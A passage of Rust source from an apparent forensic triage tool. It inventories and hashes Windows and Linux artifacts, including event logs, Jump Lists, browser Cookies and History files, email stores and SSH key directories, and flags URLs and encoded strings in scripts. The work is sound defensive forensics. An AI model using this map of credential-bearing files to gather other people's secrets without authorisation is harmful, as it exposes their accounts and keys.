                Ok(vec![serde_json::json!({
                    "collector": "artifacts",
                    "artifact_type": "srum",
                    "status": "success",
                    "path": target_path,
                    "size_bytes": size,
                    "modified_at": modified,
                    "is_ese_database": is_ese,
                    "sha256": sha256,
                    "note": "SRUM ESE database inspected successfully",
                })])
            }
            Err(e) if e.kind() == std::io::ErrorKind::PermissionDenied => {
                let elevated = is_elevated();
                Ok(vec![serde_json::json!({
                    "collector": "artifacts",
                    "artifact_type": "srum",
                    "status": if elevated { "partial" } else { "requires_elevation" },
                    "path": target_path,
                    "size_bytes": size,
                    "modified_at": modified,
                    "reason": if elevated { "SRUM database is exclusively locked by Diagnostic Policy Service (DPS)" } else { "SRUDB.dat access requires Administrator privileges" },
                    "required_privilege": "Administrator",
                })])
            }
            Err(e) => Ok(vec![serde_json::json!({
                "collector": "artifacts",
                "artifact_type": "srum",
                "status": "failed",
                "path": target_path,
                "error": e.to_string(),
            })]),
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        Ok(vec![serde_json::json!({
            "collector": "artifacts",
            "artifact_type": "srum",
            "status": "platform_note",
            "note": "SRUM is a Windows-specific forensic artifact",
        })])
    }
}

/// Windows Jump Lists parser
pub fn carve_jumplists(
    _search_path: &str,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    #[cfg(target_os = "windows")]
    {
        let mut dirs = Vec::new();
        if _search_path != "." && !_search_path.is_empty() && Path::new(_search_path).is_dir() {
            dirs.push(std::path::PathBuf::from(_search_path));
        } else if let Ok(appdata) = std::env::var("APPDATA") {
            let auto = Path::new(&appdata).join(r"Microsoft\Windows\Recent\AutomaticDestinations");
            let custom = Path::new(&appdata).join(r"Microsoft\Windows\Recent\CustomDestinations");
            if auto.exists() {
                dirs.push(auto);
            }
            if custom.exists() {
                dirs.push(custom);
            }
        }

        let mut results = Vec::new();
        for dir in dirs {
            if let Ok(entries) = std::fs::read_dir(&dir) {
                for entry in entries.flatten() {
                    let path = entry.path();
                    let name = path
                        .file_name()
                        .unwrap_or_default()
                        .to_string_lossy()
                        .to_string();
                    if name.ends_with(".automaticDestinations-ms")
                        || name.ends_with(".customDestinations-ms")
                    {
                        let meta = entry.metadata().ok();
                        let size = meta.as_ref().map(|m| m.len()).unwrap_or(0);
                        let modified = meta.and_then(|m| m.modified().ok()).map(|t| {
                            let dt: chrono::DateTime<chrono::Utc> = t.into();
                            dt.to_rfc3339()
                        });
                        let sha256 = sha256_file(&path);
                        let app_id = name.split('.').next().unwrap_or("").to_lowercase();
                        let app_name = match app_id.as_str() {
                            "1c7a9be1b15a03ba" => "File Explorer",
                            "adecfb853d77462a" => "Microsoft Word",
                            "28c8b86deab549a1" => "Microsoft Excel",
                            "9b9cdc69c1c24e2b" => "Notepad",
                            "918e0ecb43d17e23" => "Notepad++",
                            "5d696d521de238c3" => "Google Chrome",
                            "74d7f43c1561fc1e" => "Microsoft Edge",
                            "7e4dca80246863e3" => "Mozilla Firefox",
                            "c351a0212d184000" => "PowerShell",
                            "1cdb752945d4715d" => "Command Prompt",
                            _ => "Desktop Application",
                        };

                        results.push(serde_json::json!({
                            "collector": "artifacts",
                            "artifact_type": "jumplists",
                            "name": name,
                            "path": path.display().to_string(),
                            "app_id": app_id,
                            "associated_app": app_name,
                            "size_bytes": size,
                            "modified_at": modified,
                            "sha256": sha256,
                            "status": "success",
                        }));
                    }
                }
            }
        }

        if results.is_empty() {
            results.push(serde_json::json!({
                "collector": "artifacts",
                "artifact_type": "jumplists",
                "status": "no_artifacts_found",
                "note": "No Jump List files found in search directories",
            }));
        }
        Ok(results)
    }
    #[cfg(not(target_os = "windows"))]
    {
        Ok(vec![serde_json::json!({
            "collector": "artifacts",
            "artifact_type": "jumplists",
            "status": "platform_note",
            "note": "Jump Lists are a Windows-specific forensic artifact",
        })])
    }
}

/// Windows Shellbags parser
pub fn carve_shellbags(
    _search_path: &str,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    #[cfg(target_os = "windows")]
    {
        use winreg::enums::*;
        use winreg::RegKey;

        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        let mut results = Vec::new();

        let bag_paths = [
            r"Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU",
            r"Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags",
            r"Software\Microsoft\Windows\Shell\BagMRU",
            r"Software\Microsoft\Windows\Shell\Bags",
        ];

        for subpath in bag_paths {
            if let Ok(key) = hkcu.open_subkey(subpath) {
                let subkeys: Vec<String> = key.enum_keys().filter_map(|k| k.ok()).collect();
                let values: Vec<String> = key
                    .enum_values()
                    .filter_map(|v| v.ok().map(|(n, _)| n))
                    .collect();
                results.push(serde_json::json!({
                    "collector": "artifacts",
                    "artifact_type": "shellbags",
                    "hive": "HKCU",
                    "key_path": subpath,
                    "subkey_count": subkeys.len(),
                    "subkeys": subkeys.iter().take(20).collect::<Vec<_>>(),
                    "values": values.iter().take(20).collect::<Vec<_>>(),
                    "status": "success",
                }));
            }
        }

        if results.is_empty() {
            results.push(serde_json::json!({
                "collector": "artifacts",
                "artifact_type": "shellbags",
                "status": "no_artifacts_found",
                "note": "No Shellbag registry keys accessible under HKCU",
            }));
        }
        Ok(results)
    }
    #[cfg(not(target_os = "windows"))]
    {
        let mut results = Vec::new();
        if let Ok(home) = std::env::var("HOME") {
            let bookmarks_path = Path::new(&home).join(".config/gtk-3.0/bookmarks");
            if bookmarks_path.exists() {
                if let Ok(content) = std::fs::read_to_string(&bookmarks_path) {
                    for line in content.lines().filter(|l| !l.is_empty()) {
                        results.push(serde_json::json!({
                            "collector": "artifacts",
                            "artifact_type": "shellbags",
                            "path": line,
                            "source": "gtk_bookmarks",
                            "status": "success",
                        }));
                    }
                }
            }
        }
        if results.is_empty() {
            results.push(serde_json::json!({
                "collector": "artifacts",
                "artifact_type": "shellbags",
                "status": "platform_note",
                "note": "Shellbag registry keys are Windows-specific (no GTK bookmarks found)",
            }));
        }
        Ok(results)
    }
}

/// Windows ETW logs collector
pub fn collect_etw_logs(
    _search_path: &str,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    #[cfg(target_os = "windows")]
    {
        if !is_elevated() {
            return Ok(vec![serde_json::json!({
                "collector": "artifacts",
                "artifact_type": "etw",
                "status": "requires_elevation",
                "reason": "Querying active ETW kernel trace sessions requires Administrator privileges",
                "required_privilege": "Administrator",
            })]);
        }

        let output = std::process::Command::new("logman")
            .args(["query", "-ets"])
            .output();

        let mut results = Vec::new();
        if let Ok(output) = output {
            let stdout = String::from_utf8_lossy(&output.stdout);
            for line in stdout.lines() {
                let trimmed = line.trim();
                if !trimmed.is_empty()
                    && !trimmed.starts_with('-')
                    && !trimmed.starts_with("Data Collector Set")
                    && !trimmed.starts_with("The command")
                {
                    let parts: Vec<&str> = trimmed.split_whitespace().collect();
                    if parts.len() >= 2 {
                        results.push(serde_json::json!({
                            "collector": "artifacts",
                            "artifact_type": "etw",
                            "session_name": parts[0],
                            "type": parts[1],
                            "status": "success",
                        }));
                    }
                }
            }
        }

        if results.is_empty() {
            results.push(serde_json::json!({
                "collector": "artifacts",
                "artifact_type": "etw",
                "status": "success",
                "note": "ETW query completed; no active non-system trace sessions",
            }));
        }
        Ok(results)
    }
    #[cfg(not(target_os = "windows"))]
    {
        Ok(vec![serde_json::json!({
            "collector": "artifacts",
            "artifact_type": "etw",
            "status": "platform_note",
            "note": "ETW (Event Tracing for Windows) is a Windows-specific mechanism",
        })])
    }
}

/// Windows Event Logs collector
pub fn carve_event_logs(
    _search_path: &str,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    #[cfg(target_os = "windows")]
    {
        let mut results = Vec::new();
        let output = std::process::Command::new("powershell")
            .args([
                "-NoProfile",
                "-Command",
                r#"Get-WinEvent -ListLog System, Application, Security, "Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-TaskScheduler/Operational" -ErrorAction SilentlyContinue | Select-Object LogName, RecordCount, IsEnabled, LogMode, MaximumSizeInBytes | ConvertTo-Json -Compress"#,
            ])
            .output();

        if let Ok(output) = output {
            if output.status.success() {
                let stdout = String::from_utf8_lossy(&output.stdout);
                if let Ok(val) = serde_json::from_str::<serde_json::Value>(&stdout) {
                    let items = match val {
                        serde_json::Value::Array(arr) => arr,
                        serde_json::Value::Object(_) => vec![val],
                        _ => vec![],
                    };
                    for item in items {
                        let log_name = item.get("LogName").and_then(|v| v.as_str()).unwrap_or("");
                        let count = item
                            .get("RecordCount")
                            .and_then(|v| v.as_u64())
                            .unwrap_or(0);
                        let enabled = item
                            .get("IsEnabled")
                            .and_then(|v| v.as_bool())
                            .unwrap_or(false);
                        let max_size = item
                            .get("MaximumSizeInBytes")
                            .and_then(|v| v.as_u64())
                            .unwrap_or(0);
                        results.push(serde_json::json!({
                            "collector": "artifacts",
                            "artifact_type": "event_logs",
                            "log_name": log_name,
                            "record_count": count,
                            "is_enabled": enabled,
                            "max_size_bytes": max_size,
                            "status": "success",
                        }));
                    }
                }
            }
        }

        let winevt_dir = if _search_path != "." && !_search_path.is_empty() {
            Path::new(_search_path)
        } else {
            Path::new(r"C:\Windows\System32\winevt\Logs")
        };

        if winevt_dir.exists() && results.is_empty() {
            if let Ok(entries) = std::fs::read_dir(winevt_dir) {
                for entry in entries.flatten().take(50) {
                    let p = entry.path();
                    if p.extension().is_some_and(|ext| ext == "evtx") {
                        let meta = entry.metadata().ok();
                        results.push(serde_json::json!({
                            "collector": "artifacts",
                            "artifact_type": "event_logs",
                            "log_file": p.file_name().unwrap_or_default().to_string_lossy(),
                            "path": p.display().to_string(),
                            "size_bytes": meta.as_ref().map(|m| m.len()).unwrap_or(0),
                            "status": "success",
                        }));
                    }
                }
            }
        }

        if results.is_empty() {
            results.push(serde_json::json!({
                "collector": "artifacts",
                "artifact_type": "event_logs",
                "status": "no_artifacts_found",
            }));
        }
        Ok(results)
    }
    #[cfg(not(target_os = "windows"))]
    {
        Ok(vec![serde_json::json!({
            "collector": "artifacts",
            "artifact_type": "event_logs",
            "status": "platform_note",
            "note": "Windows Event Logs are a Windows-specific forensic artifact",
        })])
    }
}

/// Windows Recent Files collector
pub fn carve_recent_files(
    _search_path: &str,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    #[cfg(target_os = "windows")]
    {
        let target_dir = if _search_path != "."
            && !_search_path.is_empty()
            && Path::new(_search_path).is_dir()
        {
            std::path::PathBuf::from(_search_path)
        } else if let Ok(appdata) = std::env::var("APPDATA") {
            Path::new(&appdata).join(r"Microsoft\Windows\Recent")
        } else {
            std::path::PathBuf::from(_search_path)
        };

        if !target_dir.exists() {
            return Ok(vec![serde_json::json!({
                "collector": "artifacts",
                "artifact_type": "recent_files",
                "status": "path_not_found",
                "path": target_dir.display().to_string(),
            })]);
        }

        carve_lnk_files(&target_dir.display().to_string())
    }
    #[cfg(not(target_os = "windows"))]
    {
        let mut results = Vec::new();
        if let Ok(home) = std::env::var("HOME") {
            let xbel = Path::new(&home).join(".local/share/recently-used.xbel");
            if xbel.exists() {
                if let Ok(content) = std::fs::read_to_string(&xbel) {
                    for line in content.lines() {
                        if line.contains("<bookmark href=\"") {
                            if let Some(start) = line.find("href=\"") {
                                let rest = &line[start + 6..];
                                if let Some(end) = rest.find('"') {
                                    results.push(serde_json::json!({
                                        "collector": "artifacts",
                                        "artifact_type": "recent_files",
                                        "uri": &rest[..end],
                                        "status": "success",
                                    }));
                                }
                            }
                        }
                    }
                }
            }
        }
        if results.is_empty() {
            results.push(serde_json::json!({
                "collector": "artifacts",
                "artifact_type": "recent_files",
                "status": "no_artifacts_found",
            }));
        }
        Ok(results)
    }
}

/// Container artifacts collector (Docker, containerd, Podman, WSL2)
pub fn carve_container_artifacts(
    _search_path: &str,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    let mut results = Vec::new();

    #[cfg(target_os = "linux")]
    {
        for (engine, path) in [
            ("docker", "/var/lib/docker"),
            ("containerd", "/var/lib/containerd"),
            ("podman", "/var/lib/containers"),
            ("docker_daemon_config", "/etc/docker/daemon.json"),
        ] {
            let p = Path::new(path);
            if p.exists() {
                let meta = std::fs::metadata(p).ok();
                results.push(serde_json::json!({
                    "collector": "artifacts",
                    "artifact_type": "container",
                    "engine": engine,
                    "path": path,
                    "is_dir": p.is_dir(),
                    "size_bytes": meta.as_ref().map(|m| m.len()).unwrap_or(0),
                    "status": "success",
                }));
            }
        }
    }

    #[cfg(target_os = "windows")]
    {
        if let Ok(programdata) = std::env::var("PROGRAMDATA") {
            let docker_cli = Path::new(&programdata).join(r"DockerDesktop\version-vars.json");
            if docker_cli.exists() {
                let content = std::fs::read_to_string(&docker_cli).unwrap_or_default();
                results.push(serde_json::json!({
                    "collector": "artifacts",
                    "artifact_type": "container",
                    "engine": "docker_desktop",
                    "path": docker_cli.display().to_string(),
                    "config": content,
                    "status": "success",
                }));
            }
        }
        if let Ok(appdata) = std::env::var("APPDATA") {
            let docker_cfg = Path::new(&appdata).join(r"Docker\config.json");
            if docker_cfg.exists() {
                results.push(serde_json::json!({
                    "collector": "artifacts",
                    "artifact_type": "container",
                    "engine": "docker_client",
                    "path": docker_cfg.display().to_string(),
                    "status": "success",
                }));
            }
        }
        if let Ok(output) = std::process::Command::new("wsl")
            .args(["-l", "-q"])
            .output()
        {
            if output.status.success() {
                let u16s: Vec<u16> = output
                    .stdout
                    .as_chunks::<2>()
                    .0
                    .iter()
                    .map(|chunk| u16::from_le_bytes(*chunk))
                    .collect();
                let text = String::from_utf16_lossy(&u16s);
                for line in text.lines().map(str::trim).filter(|l| !l.is_empty()) {
                    if line.contains("docker") {
                        results.push(serde_json::json!({
                            "collector": "artifacts",
                            "artifact_type": "container",
                            "engine": "wsl2_docker",
                            "distribution": line,
                            "status": "success",
                        }));
                    }
                }
            }
        }
    }

    if results.is_empty() {
        results.push(serde_json::json!({
            "collector": "artifacts",
            "artifact_type": "container",
            "status": "no_artifacts_found",
            "note": "No active Docker, containerd, or Podman storage directories found on host",
        }));
    }

    Ok(results)
}

/// Browser artifacts collector (Chrome, Edge, Firefox, Brave)
pub fn carve_browser_artifacts(
    _search_path: &str,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    let mut results = Vec::new();

    #[cfg(target_os = "windows")]
    {
        let localappdata = std::env::var("LOCALAPPDATA").unwrap_or_default();
        let appdata = std::env::var("APPDATA").unwrap_or_default();

        let browser_roots = [
            (
                "Google Chrome",
                Path::new(&localappdata).join(r"Google\Chrome\User Data"),
            ),
            (
                "Microsoft Edge",
                Path::new(&localappdata).join(r"Microsoft\Edge\User Data"),
            ),
            (
                "Brave",
                Path::new(&localappdata).join(r"BraveSoftware\Brave-Browser\User Data"),
            ),
            (
                "Mozilla Firefox",
                Path::new(&appdata).join(r"Mozilla\Firefox\Profiles"),
            ),
        ];

        for (browser_name, root) in browser_roots {
            if root.exists() {
                let targets = [
                    "History",
                    "Cookies",
                    "Bookmarks",
                    "Preferences",
                    "places.sqlite",
                    "cookies.sqlite",
                ];
                for entry in walkdir_max_depth(&root, 3) {
                    let fname = entry.file_name().unwrap_or_default().to_string_lossy();
                    for target in targets {
                        if fname.eq_ignore_ascii_case(target) || fname.ends_with(target) {
                            let meta = entry.metadata().ok();
                            let size = meta.as_ref().map(|m| m.len()).unwrap_or(0);
                            let modified = meta.and_then(|m| m.modified().ok()).map(|t| {
                                let dt: chrono::DateTime<chrono::Utc> = t.into();
                                dt.to_rfc3339()
                            });
                            let sha256 = sha256_file(&entry);
                            results.push(serde_json::json!({
                                "collector": "artifacts",
                                "artifact_type": "browser",
                                "browser": browser_name,
                                "artifact": target,
                                "path": entry.display().to_string(),
                                "size_bytes": size,
                                "modified_at": modified,
                                "sha256": sha256,
                                "status": "success",
                            }));
                        }
                    }
                }
            }
        }
    }

    #[cfg(not(target_os = "windows"))]
    {
        if let Ok(home) = std::env::var("HOME") {
            let browser_roots = [
                (
                    "Google Chrome",
                    Path::new(&home).join(".config/google-chrome"),
                ),
                ("Chromium", Path::new(&home).join(".config/chromium")),
                ("Mozilla Firefox", Path::new(&home).join(".mozilla/firefox")),
                (
                    "Brave",
                    Path::new(&home).join(".config/BraveSoftware/Brave-Browser"),
                ),
            ];
            for (browser_name, root) in browser_roots {
                if root.exists() {
                    for entry in walkdir_max_depth(&root, 3) {
                        let fname = entry.file_name().unwrap_or_default().to_string_lossy();
                        if fname == "History"
                            || fname == "Cookies"
                            || fname == "Bookmarks"
                            || fname == "places.sqlite"
                        {
                            let meta = entry.metadata().ok();
                            let sha256 = sha256_file(&entry);
                            results.push(serde_json::json!({
                                "collector": "artifacts",
                                "artifact_type": "browser",
                                "browser": browser_name,
                                "artifact": fname,
                                "path": entry.display().to_string(),
                                "size_bytes": meta.as_ref().map(|m| m.len()).unwrap_or(0),
                                "sha256": sha256,
                                "status": "success",
                            }));
                        }
                    }
                }
            }
        }
    }

    if results.is_empty() {
        results.push(serde_json::json!({
            "collector": "artifacts",
            "artifact_type": "browser",
            "status": "no_artifacts_found",
            "note": "No supported browser profiles detected",
        }));
    }

    Ok(results)
}

/// Email client artifacts collector (Outlook, Thunderbird, Windows Mail)
pub fn carve_email_artifacts(
    _search_path: &str,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    let mut results = Vec::new();

    #[cfg(target_os = "windows")]
    {
        let localappdata = std::env::var("LOCALAPPDATA").unwrap_or_default();
        let appdata = std::env::var("APPDATA").unwrap_or_default();

        let outlook_dir = Path::new(&localappdata).join(r"Microsoft\Outlook");
        if outlook_dir.exists() {
            if let Ok(entries) = std::fs::read_dir(&outlook_dir) {
                for entry in entries.flatten() {
                    let path = entry.path();
                    let ext = path
                        .extension()
                        .map_or("", |e| e.to_str().unwrap_or(""))
                        .to_lowercase();
                    if ext == "ost" || ext == "pst" {
                        let meta = entry.metadata().ok();
                        results.push(serde_json::json!({
                            "collector": "artifacts",
                            "artifact_type": "email",
                            "client": "Microsoft Outlook",
                            "file_name": path.file_name().unwrap_or_default().to_string_lossy(),
                            "path": path.display().to_string(),
                            "size_bytes": meta.as_ref().map(|m| m.len()).unwrap_or(0),
                            "format": ext.to_uppercase(),
                            "status": "success",
                        }));
                    }
                }
            }
        }

        let tb_dir = Path::new(&appdata).join(r"Thunderbird\Profiles");
        if tb_dir.exists() {
            for entry in walkdir_max_depth(&tb_dir, 2) {
                let fname = entry.file_name().unwrap_or_default().to_string_lossy();
                if fname == "prefs.js" || fname == "panacea.dat" || fname.ends_with(".msf") {
                    let meta = entry.metadata().ok();
                    results.push(serde_json::json!({
                        "collector": "artifacts",
                        "artifact_type": "email",
                        "client": "Mozilla Thunderbird",
                        "path": entry.display().to_string(),
                        "size_bytes": meta.as_ref().map(|m| m.len()).unwrap_or(0),
                        "status": "success",
                    }));
                }
            }
        }
    }

    #[cfg(not(target_os = "windows"))]
    {
        if let Ok(home) = std::env::var("HOME") {
            let tb_dir = Path::new(&home).join(".thunderbird");
            if tb_dir.exists() {
                for entry in walkdir_max_depth(&tb_dir, 2) {
                    let fname = entry.file_name().unwrap_or_default().to_string_lossy();
                    if fname == "prefs.js" || fname.ends_with(".msf") {
                        let meta = entry.metadata().ok();
                        results.push(serde_json::json!({
                            "collector": "artifacts",
                            "artifact_type": "email",
                            "client": "Mozilla Thunderbird",
                            "path": entry.display().to_string(),
                            "size_bytes": meta.as_ref().map(|m| m.len()).unwrap_or(0),
                            "status": "success",
                        }));
                    }
                }
            }
        }
    }

    if results.is_empty() {
        results.push(serde_json::json!({
            "collector": "artifacts",
            "artifact_type": "email",
            "status": "no_artifacts_found",
            "note": "No active Outlook or Thunderbird email client data stores found",
        }));
    }

    Ok(results)
}

/// Microsoft Office / document artifacts collector
pub fn carve_office_artifacts(
    _search_path: &str,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    let mut results = Vec::new();

    #[cfg(target_os = "windows")]
    {
        use winreg::enums::*;
        use winreg::RegKey;

        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        let office_versions = ["16.0", "15.0", "14.0"];
        let apps = ["Word", "Excel", "PowerPoint", "Access"];

        for ver in office_versions {
            for app in apps {
                let mru_key = format!(r"Software\Microsoft\Office\{}\{}\User MRU", ver, app);
                if let Ok(key) = hkcu.open_subkey(&mru_key) {
                    for user_sub in key.enum_keys().flatten() {
                        let file_mru_path = format!(r"{}\{}\File MRU", mru_key, user_sub);
                        if let Ok(file_key) = hkcu.open_subkey(&file_mru_path) {
                            for (val_name, val) in file_key.enum_values().flatten() {
                                results.push(serde_json::json!({
                                    "collector": "artifacts",
                                    "artifact_type": "office",
                                    "application": app,
                                    "version": ver,
                                    "mru_slot": val_name,
                                    "document_record": val.to_string(),
                                    "status": "success",
                                }));
                            }
                        }
                    }
                }
            }
        }

        if let Ok(appdata) = std::env::var("APPDATA") {
            let office_recent = Path::new(&appdata).join(r"Microsoft\Office\Recent");
            if office_recent.exists() {
                if let Ok(entries) = std::fs::read_dir(&office_recent) {
                    for entry in entries.flatten().take(50) {
                        let path = entry.path();
                        let meta = entry.metadata().ok();
                        results.push(serde_json::json!({
                            "collector": "artifacts",
                            "artifact_type": "office",
                            "file_name": path.file_name().unwrap_or_default().to_string_lossy(),
                            "path": path.display().to_string(),
                            "size_bytes": meta.as_ref().map(|m| m.len()).unwrap_or(0),
                            "status": "success",
                        }));
                    }
                }
            }
        }
    }

    #[cfg(not(target_os = "windows"))]
    {
        if let Ok(home) = std::env::var("HOME") {
            let lo_cfg =
                Path::new(&home).join(".config/libreoffice/4/user/registrymodifications.xcu");
            if lo_cfg.exists() {
                let meta = std::fs::metadata(&lo_cfg).ok();
                results.push(serde_json::json!({
                    "collector": "artifacts",
                    "artifact_type": "office",
                    "application": "LibreOffice",
                    "path": lo_cfg.display().to_string(),
                    "size_bytes": meta.as_ref().map(|m| m.len()).unwrap_or(0),
                    "status": "success",
                }));
            }
        }
    }

    if results.is_empty() {
        results.push(serde_json::json!({
            "collector": "artifacts",
            "artifact_type": "office",
            "status": "no_artifacts_found",
            "note": "No Office MRU registry keys or recent documents found",
        }));
    }

    Ok(results)
}

/// Linux SSH config collector
pub fn carve_ssh_config(
    search_path: &str,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    let path = Path::new(search_path);
    if !path.exists() {
        return Ok(vec![serde_json::json!({
            "collector": "artifacts",
            "artifact_type": "ssh_config",
            "status": "path_not_found",
            "search_path": search_path,
        })]);
    }
    #[cfg(target_os = "linux")]
    {
        // SSH config files: /etc/ssh/sshd_config, ~/.ssh/config, ~/.ssh/authorized_keys, ~/.ssh/known_hosts
        let ssh_dir = Path::new("/etc/ssh");
        let mut results = Vec::new();

        if ssh_dir.exists() {
            for entry in walkdir_max_depth(ssh_dir, 2) {
                if entry.is_file() {
                    let sha256 = sha256_file(&entry);
                    let size = entry.metadata().map(|m| m.len()).unwrap_or(0);
                    results.push(serde_json::to_value(CarvedArtifact {
                        artifact_type: "ssh_config".to_string(),
                        path: entry.display().to_string(),
                        size_bytes: size,
                        sha256,
                        modified_at: modified_at(&entry),
                        metadata: serde_json::json!({
                            "file_type": "ssh_config",
                        }),
                        suspicious: false,
                        suspicious_reason: None,
                    })?);
                }
            }
        }

        // Also check user home directories for .ssh
        let home_dir = Path::new("/home");
        if home_dir.exists() {
            for entry in std::fs::read_dir(home_dir)
                .unwrap_or_else(|_| std::fs::read_dir("/").unwrap())
                .flatten()
            {
                let ssh_path = entry.path().join(".ssh");
                if ssh_path.exists() {
                    for ssh_entry in walkdir_max_depth(&ssh_path, 2) {
                        if ssh_entry.is_file() {
                            let sha256 = sha256_file(&ssh_entry);
                            let size = ssh_entry.metadata().map(|m| m.len()).unwrap_or(0);
                            results.push(serde_json::to_value(CarvedArtifact {
                                artifact_type: "ssh_config".to_string(),
                                path: ssh_entry.display().to_string(),
                                size_bytes: size,
                                sha256,
                                modified_at: modified_at(&ssh_entry),
                                metadata: serde_json::json!({
                                    "file_type": "ssh_user_config",
                                }),
                                suspicious: false,
                                suspicious_reason: None,
                            })?);
                        }
                    }
                }
            }
        }

        if results.is_empty() {
            results.push(serde_json::json!({
                "collector": "artifacts",
                "artifact_type": "ssh_config",
                "status": "no_artifacts_found",
            }));
        }

        Ok(results)
    }
    #[cfg(not(target_os = "linux"))]
    {
        Ok(vec![serde_json::json!({
            "collector": "artifacts",
            "artifact_type": "ssh_config",
            "status": "platform_note",
            "note": "SSH config is Linux-specific",
        })])
    }
}

/// PowerShell script analyzer
pub fn analyze_powershell_scripts(
    search_path: &str,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    analyze_static_script_files(search_path, "powershell_script", &["ps1"])
}

/// WMI/VBScript analyzer
pub fn analyze_wmi_scripts(
    search_path: &str,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    analyze_static_script_files(search_path, "wmi_script", &["vbs", "vbe"])
}

/// Shell script analyzer
pub fn analyze_shell_scripts(
    search_path: &str,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    analyze_static_script_files(search_path, "shell_script", &["sh", "bash", "zsh", "ksh"])
}

/// Python script analyzer
pub fn analyze_python_scripts(
    search_path: &str,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    analyze_static_script_files(search_path, "python_script", &["py"])
}

pub fn analyze_javascript_scripts(
    search_path: &str,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    analyze_static_script_files(search_path, "javascript_script", &["js", "mjs", "cjs"])
}

pub fn analyze_batch_scripts(
    search_path: &str,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    analyze_static_script_files(search_path, "batch_script", &["bat", "cmd"])
}

pub fn analyze_all_script_files(
    search_path: &str,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    analyze_static_script_files(
        search_path,
        "script",
        &[
            "ps1", "vbs", "vbe", "sh", "bash", "zsh", "ksh", "py", "js", "mjs", "cjs", "bat", "cmd",
        ],
    )
}

fn analyze_static_script_files(
    search_path: &str,
    artifact_type: &str,
    extensions: &[&str],
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    let root = Path::new(search_path);
    if !root.exists() {
        return Ok(vec![serde_json::json!({
            "collector": "script_analysis",
            "artifact_type": artifact_type,
            "status": "path_not_found",
            "search_path": search_path,
        })]);
    }
    let files = if root.is_file() {
        vec![root.to_path_buf()]
    } else {
        walkdir_max_depth(root, 3)
    };
    let mut records = Vec::new();
    for path in files.into_iter().filter(|path| {
        path.extension()
            .and_then(|ext| ext.to_str())
            .is_some_and(|ext| extensions.contains(&ext.to_ascii_lowercase().as_str()))
    }) {
        let bytes = match std::fs::read(&path) {
            Ok(bytes) => bytes,
            Err(error) => {
                records.push(serde_json::json!({
                    "collector": "script_analysis",
                    "artifact_type": artifact_type,
                    "path": path.display().to_string(),
                    "status": "partial",
                    "read_error": error.to_string(),
                }));
                continue;
            }
        };
        let content = String::from_utf8_lossy(&bytes);
        let analysis = static_script_indicators(&content);
        let suspicious = analysis["suspicious"].as_bool().unwrap_or(false);
        let reasons = analysis["behavior_indicators"]
            .as_array()
            .cloned()
            .unwrap_or_default();
        records.push(serde_json::json!({
            "artifact_type": artifact_type,
            "path": path.display().to_string(),
            "size_bytes": bytes.len(),
            "sha256": sha256_file(&path),
            "modified_at": modified_at(&path),
            "static_analysis": analysis,
            "suspicious": suspicious,
            "suspicious_reason": if suspicious { Some(format!("Static indicators: {}", reasons.iter().filter_map(serde_json::Value::as_str).collect::<Vec<_>>().join(", "))) } else { None::<String> },
        }));
    }
    if records.is_empty() {
        records.push(serde_json::json!({
            "collector": "script_analysis",
            "artifact_type": artifact_type,
            "status": "no_artifacts_found",
        }));
    }
    Ok(records)
}

fn static_script_indicators(content: &str) -> serde_json::Value {
    use std::collections::BTreeSet;
    let mut urls = BTreeSet::new();
    let mut domains = BTreeSet::new();
    let mut ips = BTreeSet::new();
    let mut paths = BTreeSet::new();
    let mut environment_variables = BTreeSet::new();
    let mut commands = BTreeSet::new();
    let mut encoded_strings = Vec::new();

    for line in content.lines() {
        let line_lower = line.to_ascii_lowercase();
        for token in line.split(|ch: char| {
            ch.is_whitespace()
                || matches!(
                    ch,
                    '"' | '\'' | ',' | ';' | '(' | ')' | '[' | ']' | '{' | '}'
                )
        }) {
            let token =
                token.trim_matches(|ch: char| matches!(ch, '.' | ':' | '!' | '?' | '<' | '>'));
            if token.is_empty() {
                continue;
            }
            if token.starts_with("http://")
                || token.starts_with("https://")
                || token.starts_with("ftp://")
            {
                let safe_url = token.split(['?', '#']).next().unwrap_or(token);
                urls.insert(safe_url.to_string());
                if let Some((_, authority)) = safe_url.split_once("://") {
                    let host = authority.split(['/', ':']).next().unwrap_or("");
                    if host.contains('.') && host.parse::<std::net::IpAddr>().is_err() {
                        domains.insert(host.to_ascii_lowercase());
                    }
                    if let Ok(ip) = host.parse::<std::net::IpAddr>() {
                        ips.insert(ip.to_string());
                    }
                }
            }
            let ip_candidate = token.trim_matches(|ch: char| matches!(ch, ':' | '/' | '\\'));
            if let Ok(ip) = ip_candidate.parse::<std::net::IpAddr>() {
                ips.insert(ip.to_string());
            }
            if token.starts_with('/')
                || token.starts_with("./")
                || token.starts_with("~/")
                || (token.as_bytes().get(1) == Some(&b':')
                    && token.as_bytes()[0].is_ascii_alphabetic())
                || token.to_ascii_uppercase().starts_with("HKLM\\")
                || token.to_ascii_uppercase().starts_with("HKCU\\")
            {
                paths.insert(token.to_string());
            }
            if token.len() >= 24
                && token
                    .bytes()
                    .all(|byte| byte.is_ascii_alphanumeric() || b"+/=_-".contains(&byte))
